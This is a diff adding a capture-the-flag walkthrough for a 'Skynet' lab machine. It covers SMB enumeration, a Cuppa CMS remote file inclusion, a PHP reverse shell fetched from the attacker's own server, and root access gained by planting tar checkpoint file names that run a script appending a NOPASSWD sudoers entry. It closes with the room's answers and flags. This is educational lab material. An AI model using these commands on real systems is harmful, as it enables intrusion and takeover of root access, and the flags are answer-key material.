@@ -315,3 +315,321 @@ smb: \notes\> ls
   important.txt                       N      117  Tue Sep 17 05:18:39 2019
   6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
   3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
+  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
+  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
+  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019
+  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019
+  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019
+  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019
+  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019
+  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019
+  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019
+  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019
+  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019
+  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019
+  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019
+  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019
+  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019
+  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019
+  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019
+  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019
+  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019
+  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019
+  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019
+  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019
+  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019
+  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019
+  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019
+  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019
+  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019
+  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019
+  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019
+
+                9204224 blocks of size 1024. 5821360 blocks available
+smb: \notes\> get important.txt 
+getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \notes\> exit
+```
+```text
+┌──(kali㉿kali)-[~/skynet]
+└─$ cat important.txt 
+
+1. Add features to beta CMS /45kra24zxs28v3yd
+2. Work on T-800 Model 101 blueprints
+3. Spend more time with my wife
+```
+
+## Exploitation
+```text
+┌──(kali㉿kali)-[~/skynet]
+└─$ curl -s http://10.10.158.135/45kra24zxs28v3yd
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body>
+<h1>Moved Permanently</h1>
+<p>The document has moved <a href="http://10.10.158.135/45kra24zxs28v3yd/">here</a>.</p>
+<hr>
+<address>Apache/2.4.18 (Ubuntu) Server at 10.10.158.135 Port 80</address>
+</body></html>
+```
+```text
+┌──(kali㉿kali)-[~/skynet]
+└─$ curl -s http://10.10.158.135/45kra24zxs28v3yd/
+<html>
+<head>
+<style>
+body {
+  color: white;
+}
+</style>
+</head>
+<body bgcolor="black">
+<center><br />
+<img src='miles.jpg'>
+<h2>Miles Dyson Personal Page</h2><p>Dr. Miles Bennett Dyson was the original inventor of the neural-net processor which would lead to the development of Skynet,<br /> a computer A.I. intended to control electronically linked weapons and defend the United States.</p>
+</center>
+</body>
+</html>
+
+El Doctor Miles Bennett Dyson es un personaje de Terminator. Fue el inventor original de un procesador neural que daría lugar a la elaboración de Skynet, una computadora con inteligencia artificia
+```
+```text
+┌──(kali㉿kali)-[~/skynet]
+└─$ feroxbuster --url http://10.10.158.135/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.7.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.158.135/45kra24zxs28v3yd/
+ 🚀  Threads               │ 60
+ 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
+ 💢  Status Code Filters   │ [404, 403]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.7.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET       15l       57w      418c http://10.10.158.135/45kra24zxs28v3yd/
+301      GET        9l       28w      339c http://10.10.158.135/45kra24zxs28v3yd/administrator => http://10.10.158.135/45kra24zxs28v3yd/administrator/
+301      GET        9l       28w      346c http://10.10.158.135/45kra24zxs28v3yd/administrator/alerts => http://10.10.158.135/45kra24zxs28v3yd/administrator/alerts/
+301      GET        9l       28w      347c http://10.10.158.135/45kra24zxs28v3yd/administrator/classes => http://10.10.158.135/45kra24zxs28v3yd/administrator/classes/
+301      GET        9l       28w      350c http://10.10.158.135/45kra24zxs28v3yd/administrator/components => http://10.10.158.135/45kra24zxs28v3yd/administrator/components/
+
+http://10.10.158.135/45kra24zxs28v3yd/administrator/
+
+Searching for RFI vulnerabilities affecting Cuppa CMS leads to https://www.exploit-db.com/exploits/25971. 
+Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion 
+
+http://10.10.158.135/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+        root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+messagebus:x:107:111::/var/run/dbus:/bin/false
+uuidd:x:108:112::/run/uuidd:/bin/false
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
+dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
+postfix:x:113:121::/var/spool/postfix:/bin/false
+mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
+
+:)
+
+revshell
+```
+```text
+┌──(kali㉿kali)-[~/skynet]
+└─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+--2022-09-27 20:01:47--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5491 (5.4K) [text/plain]
+Saving to: ‘php-reverse-shell.php’
+
+php-reverse-shell.php        100%[============================================>]   5.36K  --.-KB/s    in 0s      
+
+2022-09-27 20:01:47 (23.6 MB/s) - ‘php-reverse-shell.php’ saved [5491/5491]
+
+replace ip and maybe port
+```
+```text
+┌──(kali㉿kali)-[~/skynet]
+└─$ nano php-reverse-shell.php
+```
+```text
+┌──(kali㉿kali)-[~/skynet]
+└─$ python3 -m http.server                        
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.158.135 - - [27/Sep/2022 20:03:36] "GET /php-reverse-shell.php HTTP/1.0" 200 -
+
+go to
+
+http://10.10.158.135/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.81.220:8000/php-reverse-shell.php
+```
+```text
+┌──(kali㉿kali)-[~/skynet]
+└─$ rlwrap nc -nlvp 1234 
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.158.135.
+Ncat: Connection from 10.10.158.135:54716.
+Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 19:03:37 up 44 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+```
+```text
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@skynet:/$ cd /home
+cd /home
+www-data@skynet:/home$ ls
+ls
+milesdyson
+www-data@skynet:/home$ cd milesdyson
+cd milesdyson
+www-data@skynet:/home/milesdyson$ ls
+ls
+backups  mail  share  user.txt
+www-data@skynet:/home/milesdyson$ cat user.txt
+cat user.txt
+7ce5c2109a40f958099283600a9ae807
+
+priv esc
+
+www-data@skynet:/home/milesdyson$ ls -l
+ls -l
+total 16
+drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
+drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
+drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
+-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
+www-data@skynet:/home/milesdyson$ cd backups
+cd backups
+www-data@skynet:/home/milesdyson/backups$ ls -la
+ls -la
+total 4584
+drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
+drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
+-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
+-rw-r--r-- 1 root       root       4679680 Sep 27 19:06 backup.tgz
+www-data@skynet:/home/milesdyson/backups$ cat backup.sh
+cat backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+
+There is a backup script (backup.sh) that compresses the entire /var/www/html directory with tar and saves the archive to miles’ home directory. The script is executed by root every minute: 
+
+www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab
+cat /etc/crontab
+```
+```text
+# /etc/crontab: system-wide crontab
+```
+```text
+# Unlike any other crontab you don't have to run the `crontab'
+```
+```text
+# command to install the new version when you edit this file
+```
+```text
+# and files in /etc/cron.d. These files also have username fields,
+```
+```text
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+
+## Privilege Escalation
+```text
+# m h dom mon dow user  command
+*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+You can find ways to elevate the privileges using GTFOBins (https://gtfobins.github.io/gtfobins/tar/). We can execute a privileged shell with tar executed by root as follows: 
+
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+www-data@skynet:/var/www/html$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
+<LL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh                         
+www-data@skynet:/var/www/html$ touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
+<ml$ touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"               
+www-data@skynet:/var/www/html$ touch "/var/www/html/--checkpoint=1"
+touch "/var/www/html/--checkpoint=1"
+www-data@skynet:/var/www/html$ ls
+ls
+--checkpoint-action=exec=sh sudo.sh  admin   image.png   style.css
+--checkpoint=1                       ai      index.html  sudo.sh
+--checkpoint=exec=bash shell         config  js
+45kra24zxs28v3yd                     css     shell
+
+Now, after a minute, the cronjob should have been executed, and we can get our root access by just using sudo su:
+
+www-data@skynet:/var/www/html$ ls
+ls
+--checkpoint-action=exec=sh sudo.sh  admin   css         js
+--checkpoint=1                       ai      image.png   style.css
+45kra24zxs28v3yd                     config  index.html  sudo.sh
+www-data@skynet:/var/www/html$ sudo su
+sudo su
+root@skynet:/var/www/html# cat /root/root.txt
+cat /root/root.txt
+3f0372db24753accc7179a282cd6a949
+```
+![[Pasted image 20220927184258.png]]
+What is Miles password for his emails?
+Enumerate Samba
+*cyborg007haloterminator*
+What is the hidden directory?
+*/45kra24zxs28v3yd/*
+What is the vulnerability called when you can include a remote file for malicious purposes?
+*remote file inclusion*
+What is the user flag?
+*7ce5c2109a40f958099283600a9ae807*
+What is the root flag?
+A recursive call.
+*3f0372db24753accc7179a282cd6a949*
+
+## Notes / Lessons Learned
+[[Game Zone]]
+
